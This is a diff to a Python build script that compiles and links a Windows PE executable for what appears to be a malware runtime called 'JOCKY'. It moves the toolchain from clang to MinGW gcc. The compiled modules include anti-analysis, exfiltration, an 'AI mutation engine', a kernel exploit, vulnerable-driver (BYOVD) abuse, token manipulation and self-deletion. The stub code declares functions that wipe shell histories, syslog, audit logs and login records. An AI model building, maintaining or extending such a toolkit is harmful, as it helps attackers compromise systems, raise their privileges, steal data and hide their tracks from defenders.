@@ -169,9 +169,8 @@ def stage_compile(bc_path, build_dir):
 
 def stage_compile_runtime(build_dir):
     log("RUNTIME", "Compiling JOCKY runtime for Windows")
-    clang = TOOLCHAIN / "bin" / "clang"
+    mingw_gcc = "x86_64-w64-mingw32-gcc"
     include_dir = RUNTIME_DIR / "include"
-    target = "--target=x86_64-pc-windows-gnu"
     objs = []
 
     WIN = RUNTIME_DIR / "windows"
@@ -179,8 +178,6 @@ def stage_compile_runtime(build_dir):
         RUNTIME_DIR / "init" / "anti_analysis.c",
         RUNTIME_DIR / "util" / "mem.c",
         RUNTIME_DIR / "exfil" / "exfil.c",
-        RUNTIME_DIR / "exfil" / "cdn.c",
-        RUNTIME_DIR / "crypto" / "crypto.c",
         RUNTIME_DIR / "ai" / "mutation_engine.c",
         RUNTIME_DIR / "core" / "plugin.c",
         RUNTIME_DIR / "core" / "sandbox.c",
@@ -195,7 +192,6 @@ def stage_compile_runtime(build_dir):
         WIN / "execution" / "driver_interact.c",
         WIN / "exploitation" / "kernel_exploit.c",
         WIN / "byovd" / "btr_abuse.c",
-        WIN / "byovd" / "byovd.c",
         WIN / "byovd" / "byovd_modular.c",
         WIN / "registry" / "registry.c",
         WIN / "audit" / "audit.c",
@@ -205,7 +201,13 @@ def stage_compile_runtime(build_dir):
         WIN / "anti_forensics" / "self_delete.c",
         WIN / "security" / "token_manipulation.c",
         WIN / "exfil" / "enhanced_exfiltration.c",
-        RUNTIME_DIR / "linux" / "forensics" / "linux_forensics.c",
+    ]
+
+    cflags = [
+        "-O2", "-c", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
+        "-I", str(include_dir),
+        "-I", str(RUNTIME_DIR),
+        "-I", str(RUNTIME_DIR / "windows"),
     ]
 
     for src in sources:
@@ -214,11 +216,8 @@ def stage_compile_runtime(build_dir):
             continue
         obj = build_dir / f"rt_{src.parent.name}_{src.stem}.o"
         try:
-            run([str(clang), target, "-O2", "-c",
-                 "-I", str(include_dir),
+            run([mingw_gcc] + cflags + [
                  "-I", str(src.parent),
-                 "-I", str(RUNTIME_DIR),
-                 "-I", str(RUNTIME_DIR / "windows"),
                  str(src), "-o", str(obj)],
                 f"Compile {src.name}")
             objs.append(obj)
@@ -237,11 +236,45 @@ def stage_compile_runtime(build_dir):
         'int64_t array_len(void* arr) { (void)arr; return 0; }\n'
         'void* array_append(void* arr, void* elem) { (void)arr; (void)elem; return (void*)0; }\n'
         'void jocky_sleep_and_recheck(void) {}\n'
-        'int jocky_manifest_load(const char* p) { (void)p; return 0; }\n'
-        'void jocky_byovd_unload(void* ctx) { (void)ctx; }\n'
+        'typedef int jocky_aes_ctx_t;\n'
+        'typedef int jocky_rsa_key_t;\n'
+        'typedef int jocky_ecdh_key_t;\n'
+        'jocky_aes_ctx_t jocky_aes_create(const void* k, int ks, const void* i, int is) { (void)k;(void)ks;(void)i;(void)is; return 0; }\n'
+        'int jocky_aes_encrypt(jocky_aes_ctx_t c, const void* p, int pl, void* o, int* ol) { (void)c;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
+        'int jocky_aes_decrypt(jocky_aes_ctx_t c, const void* p, int pl, void* o, int* ol) { (void)c;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
+        'void jocky_aes_destroy(jocky_aes_ctx_t c) { (void)c; }\n'
+        'jocky_rsa_key_t jocky_rsa_generate_keypair(int b) { (void)b; return 0; }\n'
+        'int jocky_rsa_encrypt(jocky_rsa_key_t k, const void* p, int pl, void* o, int* ol) { (void)k;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
+        'int jocky_rsa_decrypt(jocky_rsa_key_t k, const void* p, int pl, void* o, int* ol) { (void)k;(void)p;(void)pl;(void)o;(void)ol; return -1; }\n'
+        'int jocky_rsa_sign(jocky_rsa_key_t k, const void* d, int dl, void* s, int* sl) { (void)k;(void)d;(void)dl;(void)s;(void)sl; return -1; }\n'
+        'int jocky_rsa_verify(jocky_rsa_key_t k, const void* d, int dl, const void* s, int sl) { (void)k;(void)d;(void)dl;(void)s;(void)sl; return -1; }\n'
+        'int jocky_rsa_export_public_pem(jocky_rsa_key_t k, void* o, int* ol) { (void)k;(void)o;(void)ol; return -1; }\n'
+        'int jocky_rsa_export_private_pem(jocky_rsa_key_t k, void* o, int* ol) { (void)k;(void)o;(void)ol; return -1; }\n'
+        'void jocky_rsa_destroy(jocky_rsa_key_t k) { (void)k; }\n'
+        'jocky_ecdh_key_t jocky_ecdh_generate_keypair(int c) { (void)c; return 0; }\n'
+        'int jocky_ecdh_export_public_key(jocky_ecdh_key_t k, void* o, int* ol) { (void)k;(void)o;(void)ol; return -1; }\n'
+        'int jocky_ecdh_compute_shared_secret(jocky_ecdh_key_t k, const void* pk, int pkl, void* s, int* sl) { (void)k;(void)pk;(void)pkl;(void)s;(void)sl; return -1; }\n'
+        'void jocky_ecdh_destroy(jocky_ecdh_key_t k) { (void)k; }\n'
+        'int jocky_exfil_local_cdn(const void* d, int l, const char* n) { (void)d;(void)l;(void)n; return -1; }\n'
+        'int jocky_exfil_list_cdn_files(void* o, int c) { (void)o;(void)c; return 0; }\n'
+        'int jocky_exfil_verify_cdn_hash(const char* n) { (void)n; return -1; }\n'
+        'int jocky_exfil_download_from_cdn(const char* n, void* o, int* ol) { (void)n;(void)o;(void)ol; return -1; }\n'
+        'int jocky_linux_wipe_bash_history(void) { return 0; }\n'
+        'int jocky_linux_wipe_zsh_history(void) { return 0; }\n'
+        'int jocky_linux_wipe_shell_history(void) { return 0; }\n'
+        'int jocky_linux_clear_syslog(void) { return 0; }\n'
+        'int jocky_linux_clear_audit_log(void) { return 0; }\n'
+        'int jocky_linux_clear_journal(void) { return 0; }\n'
+        'int jocky_linux_clear_dmesg(void) { return 0; }\n'
+        'int jocky_linux_wipe_tmp(void) { return 0; }\n'
+        'int jocky_linux_wipe_home_cache(void) { return 0; }\n'
+        'int jocky_linux_clear_command_history(void) { return 0; }\n'
+        'int jocky_linux_wipe_sudo_logs(void) { return 0; }\n'
+        'int jocky_linux_wipe_wtmp_utmp(void) { return 0; }\n'
+        'int jocky_linux_cleanup_all_forensics(void) { return 0; }\n'
     )
     stub.write_text(stub_src)
-    run([str(clang), target, "-c", str(stub), "-o", str(stub_o)], "Compile compat stub")
+    run([mingw_gcc, "-c", str(stub), "-o", str(stub_o)], "Compile compat stub")
     objs.append(stub_o)
     log("RUNTIME", f"Total runtime objects: {len(objs)}")
     return objs
@@ -250,13 +283,14 @@ def stage_compile_runtime(build_dir):
 def stage_link(obj_path, runtime_objs, build_dir, output_name):
     log("LINK", "Linking Windows PE executable")
     exe_path = build_dir / output_name
-    clang = TOOLCHAIN / "bin" / "clang"
+    mingw_gcc = "x86_64-w64-mingw32-gcc"
 
     all_objs = [str(obj_path)] + [str(o) for o in runtime_objs]
     cmd = [
-        str(clang), "--target=x86_64-pc-windows-gnu",
+        mingw_gcc,
         *all_objs,
         "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
+        "-ladvapi32", "-lkernel32", "-lws2_32",
         "-o", str(exe_path),
     ]
     run(cmd, "Link PE executable")
